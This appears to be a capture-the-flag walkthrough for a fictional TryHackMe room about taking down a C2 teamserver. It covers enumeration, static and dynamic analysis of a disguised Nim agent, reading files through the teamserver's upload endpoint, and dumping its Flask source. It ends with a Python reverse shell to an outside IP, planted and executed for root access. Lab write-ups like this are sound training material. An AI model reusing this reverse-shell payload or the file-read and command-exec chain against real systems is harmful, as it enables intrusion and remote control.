----
We have reason to believe a corporate webserver has been compromised by RISOTTO GROUP. Cyber interdiction is authorized for this operation. Find their teamserver and take it down.
----

![222](https://tryhackme-images.s3.amazonaws.com/room-icons/b6cc9563554d62c4c3e5fb1eaa1be238.png)

### Task 1  Mission Brief - OPERATION: OVERCOOKED RISOTTO

 Download Task Files

(AUTHOR'S NOTE: This THM room should be treated as a work of fiction. The author of this room does not condone unauthorized hacking of anything for any reason. Hacking back is a crime.)

**IMPORTANT:** Make sure to add the IP address as `takedown.thm.local` to your `/etc/hosts` file.

Good morning, operator! The Commanding Officer is very excited about this mission. The mission brief is ready for you.

Click "Download Task Files" to download the mission brief. Read it carefully!

When you are ready, proceed with the operation.

Answer the questions below

Ready!

 Completed

### Task 2  Start VM

 Start Machine

VM IP: MACHINE_IP

REMINDER: Make sure to add the IP address as `takedown.thm.local` to your `/etc/hosts` file.

**Note:** This VM may take about 5-8 minutes to fully initialize. A basic Nmap scan (`nmap -sC -sV takedown.thm.local`) should indicate two open ports.  

Answer the questions below

VM Started

 Completed

### Task 3  User.txt

Enter the value of user.txt

Answer the questions below

```
┌──(witty㉿kali)-[~]
└─$ tac /etc/hosts
10.10.191.181 takedown.thm.local

┌──(witty㉿kali)-[~/Downloads]
└─$ nmap -sC -sV takedown.thm.local
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-30 15:49 EDT
Nmap scan report for takedown.thm.local (10.10.191.181)
Host is up (0.20s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 1d55623c602eb61c5fb4aefa0aa4a94f (RSA)
|   256 f1b59a77c6aa390cb0b5eb53994b87dc (ECDSA)
|_  256 0dfbe49c01495d46c35d4e9926e44596 (ED25519)
80/tcp open  http    nginx 1.23.1
|_http-server-header: nginx/1.23.1
| http-robots.txt: 1 disallowed entry 
|_/favicon.ico
|_http-title: Infinity
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.69 seconds

XML Parsing Error: no root element found
Location: http://takedown.thm.local/inc/sendEmail.php
Line Number 9, Column 3:

┌──(witty㉿kali)-[~]
└─$ gobuster -t 64 dir -e -k -u http://takedown.thm.local/ -w /usr/share/wordlists/dirb/common.txt -x txt             
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://takedown.thm.local/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              txt
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2023/06/30 15:54:49 Starting gobuster in directory enumeration mode
===============================================================
http://takedown.thm.local/.htaccess.txt        (Status: 403) [Size: 283]
http://takedown.thm.local/.htpasswd.txt        (Status: 403) [Size: 283]
http://takedown.thm.local/.htpasswd            (Status: 403) [Size: 283]
http://takedown.thm.local/.hta                 (Status: 403) [Size: 283]
http://takedown.thm.local/.hta.txt             (Status: 403) [Size: 283]
http://takedown.thm.local/.htaccess            (Status: 403) [Size: 283]
http://takedown.thm.local/css                  (Status: 301) [Size: 322] [--> http://takedown.thm.local/css/]
http://takedown.thm.local/fonts                (Status: 301) [Size: 324] [--> http://takedown.thm.local/fonts/]
http://takedown.thm.local/favicon.ico          (Status: 200) [Size: 605010]
http://takedown.thm.local/images               (Status: 301) [Size: 325] [--> http://takedown.thm.local/images/]
http://takedown.thm.local/inc                  (Status: 301) [Size: 322] [--> http://takedown.thm.local/inc/]
http://takedown.thm.local/index.html           (Status: 200) [Size: 25844]
http://takedown.thm.local/js                   (Status: 301) [Size: 321] [--> http://takedown.thm.local/js/]
http://takedown.thm.local/readme.txt           (Status: 200) [Size: 4763]
http://takedown.thm.local/robots.txt           (Status: 200) [Size: 36]
http://takedown.thm.local/robots.txt           (Status: 200) [Size: 36]
http://takedown.thm.local/server-status        (Status: 403) [Size: 283]
Progress: 9210 / 9230 (99.78%)
===============================================================
2023/06/30 15:55:19 Finished
===============================================================

┌──(witty㉿kali)-[~]
└─$ wget http://takedown.thm.local/favicon.ico
--2023-06-30 15:58:25--  http://takedown.thm.local/favicon.ico
Resolving takedown.thm.local (takedown.thm.local)... 10.10.191.181
Connecting to takedown.thm.local (takedown.thm.local)|10.10.191.181|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 605010 (591K) [image/vnd.microsoft.icon]
Saving to: ‘favicon.ico’

favicon.ico          100%[======================>] 590.83K   241KB/s    in 2.4s    

2023-06-30 15:58:28 (241 KB/s) - ‘favicon.ico’ saved [605010/605010]

                                                                                    
┌──(witty㉿kali)-[~]
└─$ wget http://takedown.thm.local/images/shutterbug.jpg
--2023-06-30 15:58:35--  http://takedown.thm.local/images/shutterbug.jpg
Resolving takedown.thm.local (takedown.thm.local)... 10.10.191.181
Connecting to takedown.thm.local (takedown.thm.local)|10.10.191.181|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 133977 (131K) [image/jpeg]
Saving to: ‘shutterbug.jpg’

shutterbug.jpg       100%[======================>] 130.84K   161KB/s    in 0.8s    

2023-06-30 15:58:36 (161 KB/s) - ‘shutterbug.jpg’ saved [133977/133977]

                                                                                    
┌──(witty㉿kali)-[~]
└─$ ls                         
buffer_overflow                                  go
bug_hunter                                       GrayHacking
burp-hash.sqlite                                 Music
cct2019.rep                                      Pictures
clean.sh                                         Programacion
corgo2.jpg                                       Public
Desktop                                          puppos.jpeg
Dockerfile                                       shell-witty.jpeg.php
Documents                                        shell-witty.jpeg.php_original
Downloads                                        shutterbug.jpg
favicon.ico                                      Templates
ferox-http_10_10_230_190:8080_-1678482349.state  test2-witty.jpeg.php
ferox-http_10_10_230_190:8080_-1678482581.state  test2-witty.jpeg.php_original
ferox-http_10_10_230_190:8080_-1678483133.state  testing.gpr
fin1.py                                          testing.rep
fin2.py                                          test-witty.jpeg.php_original
fin3.py                                          threadfix-cli.log
final.py                                         Videos
                                                                                    
┌──(witty㉿kali)-[~]
└─$ cd Downloads                             
                                                                                    
┌──(witty㉿kali)-[~/Downloads]
└─$ mv shutterbug.jpg.bak ..   

basic static analysis

┌──(witty㉿kali)-[~]
└─$ file favicon.ico && file shutterbug.jpg*
favicon.ico: PE32+ executable (GUI) x86-64, for MS Windows, 17 sections
shutterbug.jpg:     JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, progressive, precision 8, 1050x700, components 3
shutterbug.jpg.bak: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=9e3c7f037a52f26b1982f131013708f59786d773, for GNU/Linux 3.2.0, not stripped

┌──(witty㉿kali)-[~]
└─$ sha256sum favicon.ico && sha256sum shutterbug.jpg*
80e19a10aca1fd48388735a8e2cfc8021724312e1899a1ed8829db9003c2b2dc  favicon.ico
0a6583131935af7ad7b527d86af6372c4ca9d7ff74f55a3f25a3d1c2a41e891f  shutterbug.jpg
265d515fbe1e8e19da9adeabebb4e197e2739dad60d38511d5d23de4fbcf3970  shutterbug.jpg.bak

┌──(witty㉿kali)-[~]
└─$ strings -n 6 favicon.ico | grep nim
fatal.nim
io.nim
fatal.nim
parseutils.nim
strutils.nim
@strutils.nim(739, 11) `sep.len > 0` 
oserr.nim
os.nim

                                                                                                      
┌──(witty㉿kali)-[~]
└─$ strings -n 6 favicon.ico > malware_analysys

@[*] Sleeping: 10000
@results
@[*] Result: 
@[x] Error: 
@Error
@/download
@Could not read file: 
@[x] Download args: download [agent source] [server destination]
[*] For example: download C:\Windows\Temp\foo.exe /home/kali/foo.exe
@http://takedown.thm.local/
@File written!
@[+] Downloaded 
@/upload
@/api/agents/
@ from C2 server
@[*] Ready to receive 
@[x] Upload args: upload [server source] [agent destination]
[*] For example: upload foo.exe C:\Windows\Temp\foo.exe
@Error: 
@exec 
@get_hostname
@download
@upload
@[*] Command to run: 
@/command
@http://takedown.thm.local/api/agents/
@[*] Checking for command...
@[*] Hostname: 
@[*] My UID is: 
@http://takedown.thm.local/api/agents/register
@Authorization
@httpclient.nim(1144, 15) `false` 
@Transfer-Encoding
@Content-Length
@httpclient.nim(1082, 13) `not url.contains({'\r', '\n'})` url shouldn't contain any newline characters
@application/json
@Content-Type
@Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5
@random.nim(325, 10) `x.a <= x.b` 
@hostname
@[*] Key matches!
@c.oberst
@whoami
@[*] Checking keyed username...
@[*] Drone ready!
@{prog}
Usage:
   [options] 
Options:
  -h, --help
  -v, --ver
@iterators.nim(240, 11) `len(a) == L` the length of the seq changed while iterating over it
@Unknown argument(s): 
@argparse_help
@ShortCircuit on 
@--ver
@--help
@Can't obtain a value from a `none`
Unknown error
Argument domain error (DOMAIN)
Overflow range error (OVERFLOW)
Partial loss of significance (PLOSS)
Total loss of significance (TLOSS)
The result is too small to be represented (UNDERFLOW)
Argument singularity (SIGN)
_matherr(): %s in %s(%g, %g)  (retval=%g)
Mingw-w64 runtime failure:
Address %p has no image-section
  VirtualQuery failed for %d bytes at address %p
  VirtualProtect failed with code 0x%x
  Unknown pseudo relocation protocol version %d.
  Unknown pseudo relocation bit size %d.
.pdata

┌──(witty㉿kali)-[~]
└─$ curl http://takedown.thm.local/api/agents 
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.52 (Ubuntu) Server at takedown.thm.local Port 80</address>
</body></html>

A potential username, `c.oberst` and a string indicating that a key has matched.

Revisiting the Intel Brief, environmental keying is noted as a tactic used by Risotto Group:

advanced static analysis of favicon.ico

┌──(witty㉿kali)-[~]
└─$ cutter favicon.ico 

or ghidra

Nim programs are a little weird. Usually, there is an entrypoint that leads to main(), which leads to another function called NimMain(), which leads to another function called NimMainModule(), which leads to the actual start of the program. If the program is running in Windows, there’s yet another function call for WinMain().

Basically, Nim has a few wrapper functions around the true main() method of a program. So we need to peel back some layers.

From main(), we trace into NimMain():

┌──(witty㉿kali)-[~]
└─$ chmod +x shutterbug.jpg.bak 
                                                                                                      
┌──(witty㉿kali)-[~]
└─$ ./shutterbug.jpg.bak             
🥺🥺😢😢😢😭😭😭😂😂🤣🤣

┌──(witty㉿kali)-[~]
└─$ ./shutterbug.jpg.bak -h
😂🐍🚀🚀🤫🎇🎇🎆🙏🔥❤️‍🔥💖💯👋👋👋💯❤️‍🔥💖🔥🔥🔥❤️‍🔥🤫🎇🎇🎆🎆🚀🍆

Usage:
   [options] 

Options:
  -h, --help
  -v, --ver

┌──(witty㉿kali)-[~]
└─$ ./shutterbug.jpg.bak -v
[*] Drone ready!
[*] Checking keyed username...
🥺🥺😢😢😢😭😭😭😂😂🤣🤣



──(witty㉿kali)-[~]
└─$ sudo useradd -m c.oberst

┌──(witty㉿kali)-[~]
└─$ sudo su c.oberst



┌──(witty㉿kali)-[/home/c.oberst]
└─$ sudo su c.oberst    
$ ls
$ wget http://takedown.thm.local/images/shutterbug.jpg.bak
--2023-06-30 16:43:45--  http://takedown.thm.local/images/shutterbug.jpg.bak
Resolving takedown.thm.local (takedown.thm.local)... 10.10.191.181
Connecting to takedown.thm.local (takedown.thm.local)|10.10.191.181|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 333120 (325K) [application/x-trash]
Saving to: ‘shutterbug.jpg.bak’

shutterbug.jpg.bak        100%[===================================>] 325.31K   224KB/s    in 1.5s    

2023-06-30 16:43:47 (224 KB/s) - ‘shutterbug.jpg.bak’ saved [333120/333120]

$ chmod +x shutterbug.jpg.bak
$ ./shutterbug.jpg.bak
-v
^CSIGINT: Interrupted by Ctrl-C.

$ ./shutterbug.jpg.bak -v
[*] Drone ready!
[*] Checking keyed username...
[*] Key matches!
[*] My UID is: qemm-pciq-dxux-skng
[*] Hostname: kali
[*] Checking for command...
[*] Command to run: id
[*] Result: uid=1002(c.oberst) gid=1002(c.oberst) groups=1002(c.oberst)
[*] Sleeping: 10000
[*] Checking for command...
[*] Command to run: hostname
[*] Result: 
[*] Sleeping: 10000
[*] Checking for command...
[*] Command to run: hostname
[*] Result: 
[*] Sleeping: 10000
[*] Checking for command...
[*] Command to run: hostname
[*] Result: 
[*] Sleeping: 10000
[*] Checking for command...
[*] Command to run: upload bar.txt foo.txt
[*] Ready to receive bar.txt from C2 server
[+] Downloaded bar.txt from C2 server
[*] Result: File written!
[*] Sleeping: 10000
[*] Checking for command...
[*] Command to run: pwd
[*] Result: /home/c.oberst
[*] Sleeping: 10000
[*] Checking for command...
[*] Command to run: upload bar.txt foo.txt
[*] Ready to receive bar.txt from C2 server
[+] Downloaded bar.txt from C2 server
[*] Result: File written!
[*] Sleeping: 10000
[*] Checking for command...
[*] Command to run: id
[*] Result: uid=1002(c.oberst) gid=1002(c.oberst) groups=1002(c.oberst)
[*] Sleeping: 10000
[*] Checking for command...
[*] Command to run: upload bar.txt foo.txt
[*] Ready to receive bar.txt from C2 server
[+] Downloaded bar.txt from C2 server
[*] Result: File written!
[*] Sleeping: 10000
[*] Checking for command...
[*] Command to run: whoami
[*] Result: c.oberst
[*] Sleeping: 10000
[*] Checking for command...
[*] Command to run: upload bar.txt foo.txt
[*] Ready to receive bar.txt from C2 server
[+] Downloaded bar.txt from C2 server
[*] Result: File written!
[*] Sleeping: 10000
[*] Checking for command...
oserr.nim(95)            raiseOSError
Error: unhandled exception: Connection refused [OSError]

using wireshark


GET /api/agents/pbgd-ovbw-xkub-wznl/command HTTP/1.1
Host: takedown.thm.local
Connection: Keep-Alive
user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5

HTTP/1.1 405 Method Not Allowed
Server: WebSockify Python/3.6.9
Date: Fri, 30 Jun 2023 20:49:44 GMT
Connection: close
Content-Type: text/html;charset=utf-8
Content-Length: 472

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
        "http://www.w3.org/TR/html4/strict.dtd">
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
        <title>Error response</title>
    </head>
    <body>
        <h1>Error response</h1>
        <p>Error code: 405</p>
        <p>Message: Method Not Allowed.</p>
        <p>Error code explanation: 405 - Specified method is invalid for this resource.</p>
    </body>
</html>

──(witty㉿kali)-[/home/c.oberst]
└─$ sudo su c.oberst
$ ./shutterbug.jpg.bak -v
[*] Drone ready!
[*] Checking keyed username...
[*] Key matches!
[*] My UID is: pbgd-ovbw-xkub-wznl
[*] Hostname: kali
[*] Checking for command...
[*] Command to run: <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
        "http://www.w3.org/TR/html4/strict.dtd">
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
        <title>Error response</title>
    </head>
    <body>
        <h1>Error response</h1>
        <p>Error code: 405</p>
        <p>Message: Method Not Allowed.</p>
        <p>Error code explanation: 405 - Specified method is invalid for this resource.</p>
    </body>
</html>

[*] Result: 
[*] Sleeping: 10000

┌──(witty㉿kali)-[/home/c.oberst]
└─$ curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5" http://takedown.thm.local           
.   

┌──(witty㉿kali)-[/home/c.oberst]
└─$ curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5" http://takedown.thm.local/api/agents
{'ilcn-qlob-ycju-wovt': 'www-infinity'}   

┌──(witty㉿kali)-[/home/c.oberst]
└─$ gobuster dir --url=http://takedown.thm.local/api --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5" --exclude-length 1
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://takedown.thm.local/api
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] Exclude Length:          1
[+] User Agent:              Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5
[+] Timeout:                 10s
===============================================================
2023/06/30 17:04:29 Starting gobuster in directory enumeration mode
===============================================================
/server               (Status: 200) [Size: 71]
/agents               (Status: 200) [Size: 39]

┌──(witty㉿kali)-[/home/c.oberst]
└─$ curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5" http://takedown.thm.local/api/server
{"guid": "9e29fc5d-31dc-4fc2-9318-d17b2694d8aa", "name": "C2-SHRIKE-1"}                                                               
┌──(witty㉿kali)-[/home/c.oberst]
└─$ curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5" http://takedown.thm.local/api/agents
{'ilcn-qlob-ycju-wovt': 'www-infinity'}  

If we go back to our running agent on our malware analysis machine, we can observe the live agent running commands. One of these commands is the `upload bar.txt foo.txt` 

┌──(witty㉿kali)-[/home/c.oberst]
└─$ curl -X POST -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5" http://takedown.thm.local/api/agents/ilcn-qlob-ycju-wovt/upload -H "Content-Type: application/json" -d '{"file":"/etc/passwd"}'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin

using burpsuite

GET /api/agents HTTP/1.1

Host: takedown.thm.local

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Connection: close

Upgrade-Insecure-Requests: 1

HTTP/1.1 200 OK

Server: nginx/1.23.1

Date: Fri, 30 Jun 2023 21:36:21 GMT

Content-Type: text/html; charset=utf-8

Content-Length: 70

Connection: close

Access-Control-Allow-Origin: *



{'ilcn-qlob-ycju-wovt': 'www-infinity', 'lwdb-sdse-wgkb-nuan': 'kali'}

REQUEST

GET /api/agents/commands HTTP/1.1

Host: takedown.thm.local

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Connection: close

Upgrade-Insecure-Requests: 1

RESPONSE

HTTP/1.1 200 OK

Server: nginx/1.23.1

Date: Fri, 30 Jun 2023 21:34:01 GMT

Content-Type: text/html; charset=utf-8

Content-Length: 201

Connection: close

Access-Control-Allow-Origin: *



Available Commands: ['id', 'whoami', 'upload [Usage: upload server_source agent_dest]', 'download [usage download agent_source server_dest]', 'exec [Usage: exec command_to_run]', 'pwd', 'get_hostname']


POST /api/agents/ilcn-qlob-ycju-wovt/upload HTTP/1.1

Host: takedown.thm.local

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Encoding: gzip, deflate

Accept-Language: en-US,en;q=0.5

Connection: close

Content-Type: application/json

Content-Length: 27



{"file":"/etc/hosts"

}


HTTP/1.1 200 OK

Server: nginx/1.23.1

Date: Fri, 30 Jun 2023 21:53:48 GMT

Content-Type: text/html; charset=utf-8

Content-Length: 173

Connection: close

Access-Control-Allow-Origin: *



127.0.0.1	localhost
::1	localhost ip6-localhost ip6-loopback
fe00::0	ip6-localnet
ff00::0	ip6-mcastprefix
ff02::1	ip6-allnodes
ff02::2	ip6-allrouters
172.20.0.7	c2-shrike-1


┌──(c.oberst㉿kali)-[~]
└─$ curl -X POST -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 z.5.x.2.l.8.y.5" http://takedown.thm.local/api/agents/ilcn-qlob-ycju-wovt/upload -H "Content-Type: application/json" -d '{"file":"app.py"}'
import logging
import sys
import json
from threading import Thread
import re
import random
from os import system

import flask
from flask import request, abort
from flask_cors import CORS

HEADER_KEY = "z.5.x.2.l.8.y.5"

command_list = []
command_to_execute_next = ""
command_stack_reset_flag = False
agg_commands = open('aggressor.txt', 'r')
lines = agg_commands.readlines()
for line in lines:
    command_list.append(line.strip())

available_commands = ['id', 'whoami', 'upload [Usage: upload server_source agent_dest]', 'download [usage download agent_source server_dest]', 'exec [Usage: exec command_to_run]', 'pwd', "get_hostname"]

live_agents = {}

app = flask.Flask(__name__)
app.secret_key = "000011112222333344445555666677778888"

logging.basicConfig(filename='teamserver.log', level=logging.DEBUG)


def is_user_agent_keyed(user_agent):
    return HEADER_KEY in user_agent


def json_response(app, data):
    try:
        return app.response_class(
            response=json.dumps(data),
            status=200,
            mimetype='application/json'
        )
    except Exception as e:
        return str(e)


def is_command_reset_flag_set(command_stack_reset_flag):
    return command_stack_reset_flag


@app.route("/")
def hello_world():
    if is_user_agent_keyed(request.headers.get('User-Agent')):
        return "."
    else:
        abort(404)


@app.route('/api/server', methods=['GET'])
def get_server_info():
    if is_user_agent_keyed(request.headers.get('User-Agent')):
        server_info = {"guid": "9e29fc5d-31dc-4fc2-9318-d17b2694d8aa", "name": "C2-SHRIKE-1"}
        return json_response(app, server_info)
    else:
        abort(404)

@app.route('/api/agents', methods=['GET'])
def get_agent_info():
    if is_user_agent_keyed(request.headers.get('User-Agent')):
        if live_agents:
            return str(live_agents), 200
        else:
            return "No live agents", 200
    else:
        abort(404)


@app.route(f'/api/agents/commands', methods=['GET'])
def get_agent_commands():
    if is_user_agent_keyed(request.headers.get('User-Agent')):
        return f"Available Commands: {available_commands}", 200
    else:
        abort(404)


@app.route('/api/agents/register', methods=['POST'])
def post_register_agent():
    if is_user_agent_keyed(request.headers.get('User-Agent')):
        if request.json:
            try:
                uid = request.json["uid"]
                hostname = request.json["hostname"]
                live_agents[uid] = hostname
                msg = f"New agent UID: {uid} on host {hostname}"
                app.logger.debug(msg)
                print(msg)
                return msg, 200
            except Exception as e:
                return str(e), 500
        return "MESSAGE: {0}".format(request.is_json)
    else:
        abort(404)


@app.route('/api/agents/<uid>', methods=['GET'])
def get_agent(uid):
    if is_user_agent_keyed(request.headers.get('User-Agent')):
        if uid in live_agents:
            info = live_agents.get(uid)
            return f"Agent info:\nUID: {uid} - Hostname: {info}", 200
        else:
            return "You're not a live agent", 401
    else:
        abort(404)


@app.route('/api/agents/<uid>/command', methods=['GET', 'POST'])
def get_agent_command(uid):
    if is_user_agent_keyed(request.headers.get('User-Agent')):
        if uid in live_agents:
            if request.method == 'GET':
                global command_to_execute_next
                global command_stack_reset_flag
                if command_to_execute_next:
                    command_reset_flag = is_command_reset_flag_set(command_stack_reset_flag)
                    if command_reset_flag:
                        command = random.choice(command_list)
                        return f"{command}", 200
                    else:
                        command = command_to_execute_next
                        command_stack_reset_flag = True
                        return f"{command}", 200
                else:
                    command = random.choice(command_list)
                    return f"{command}", 200
            if request.json:
                result = request.json["results"]
                app.logger.debug(result)
                print(result)
                return "OK", 200
        else:
            return "You're not a live agent", 401
    else:
        abort(404)


@app.route(f'/api/agents/<uid>/upload', methods=['POST'])
def post_upload(uid):
    if is_user_agent_keyed(request.headers.get('User-Agent')):     
        if uid in live_agents:
            if request.json:
                file = request.json["file"]
                f = open(file,"rb")
                data = f.read()
                f.close()
                return data, 200
        else:
            return 401
    else:
        abort(404)


@app.route(f'/api/agents/<uid>/download', methods=['POST'])
def post_download(uid):
    if is_user_agent_keyed(request.headers.get('User-Agent')):     
        if uid in live_agents:
            if request.json:
                file = request.json["file"]
                if file in ["app.py", "aggressor.txt"]:
                    abort(404)
                data = request.json["data"]
                f = open(file ,"w")
                f.write(data)
                f.close()
                return "OK", 200
        else:
            return 401
    else:
        abort(404)


@app.route(f'/api/server/exec', methods=['POST'])
def post_server_exec():
    if is_user_agent_keyed(request.headers.get('User-Agent')):
        if request.json:
            cmd = request.json['cmd']
            res = system(f"{cmd}")
            return f"Command: {cmd} - Result code: {res}", 200
        else:
            return "Bad request", 400
    else:
        abort(404)


@app.route('/api/agents/<uid>/exec', methods=['GET', 'POST'])
def post_agent_exec(uid):
    if is_user_agent_keyed(request.headers.get('User-Agent')):
        if uid in live_agents:
            if request.method == 'GET':
                return f"EXEC: {uid}", 200
            if request.method == 'POST':
                if request.json:
                    global command_to_execute_next
                    command_to_execute_next = request.json["cmd"]
                    global command_stack_reset_flag
                    command_stack_reset_flag = False
                    msg = f"New commnad to execute: {command_to_execute_next}"
                    app.logger.debug(msg)
                    print(msg)
                    return msg, 200
                else:
                    return "Bad request", 400
            else:
                abort(404)
        else:
            abort(404)
    else:
        abort(404)


@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch_all(path):
    if is_user_agent_keyed(request.headers.get('User-Agent')):
        return flask.render_template("index.html")
    else:
        abort(404)


CORS(app, resources={r"/*": {"origins": "*"}})


if __name__=="__main__":
    app.run(host="0.0.0.0", port=8000)



┌──(c.oberst㉿kali)-[~]
└─$ curl -X POST -A "z.5.x.2.l.8.y.5" http://takedown.thm.local/api/agents/ilcn-qlob-ycju-wovt/download -H "Content-Type: application/json" -d '{
   "file": "revshell.py",
   "data": "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.8.19.103\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])"
}'
OK

┌──(c.oberst㉿kali)-[~]
└─$ curl -X POST -A "z.5.x.2.l.8.y.5" http://takedown.thm.local/api/server/exec -H "Content-Type: application/json" -d '{"cmd": "python3 revshell.py"}'


┌──(witty㉿kali)-[/home/c.oberst]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.195.24] 37890
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# hostname
c2-shrike-1
# python3 -c 'import pty;pty.spawn("/bin/bash")'
root@c2-shrike-1:/python-docker# 
root@c2-shrike-1:/python-docker# cd /
cd /
root@c2-shrike-1:/# ls
ls
bin   dev  home  lib64	mnt  proc	    root  sbin	sys  usr
boot  etc  lib	 media	opt  python-docker  run   srv	tmp  var
root@c2-shrike-1:/# cd python-docker
cd python-docker
root@c2-shrike-1:/python-docker# ls
ls
Dockerfile  aggressor.txt  bar.txt	requirements.txt  teamserver.log
agent	    app.py	   favicon.ico	revshell.py	  templates
root@c2-shrike-1:/python-docker# cat aggressor.txt
cat aggressor.txt
whoami
id
pwd
hostname
upload bar.txt foo.txtroot@c2-shrike-1:/python-docker# cd agent
cd agent
root@c2-shrike-1:/python-docker/agent# ls
ls
commands  favicon.ico  main.nim  shutterbug.jpg.bak  svcgh0st

root@c2-shrike-1:/python-docker/agent# cat main.nim
cat main.nim
#[
    C2 Agent Emulator
    Built for Takedown THM box

    Compile for dev:
        nim c --run main.nim -v

    Compile for release:
        Windows [favicon.ico]
            nim c --d:mingw --d:release --deadCodeElim:on --opt:size --stackTrace:off --lineTrace:off --app=gui -d:strip --cpu=amd64 -o:favicon.ico main.nim
        Linux [shutterbug.jpg.bak]
            nim c --d:release --deadCodeElim:on --opt:speed --stackTrace:off --lineTrace:off -d:strip --cpu=amd64 -o:shutterbug.jpg.bak main.nim
        Linux [webserver-RAT]
            nim c --d:release --deadCodeElim:on --opt:size --stackTrace:off --lineTrace:off -d:strip --cpu=amd64 -o:svcgh0st main.nim
            Ensure keyed username and teamserver IP are changed
]#
from os import sleep
import osproc
import std/[httpclient, json]
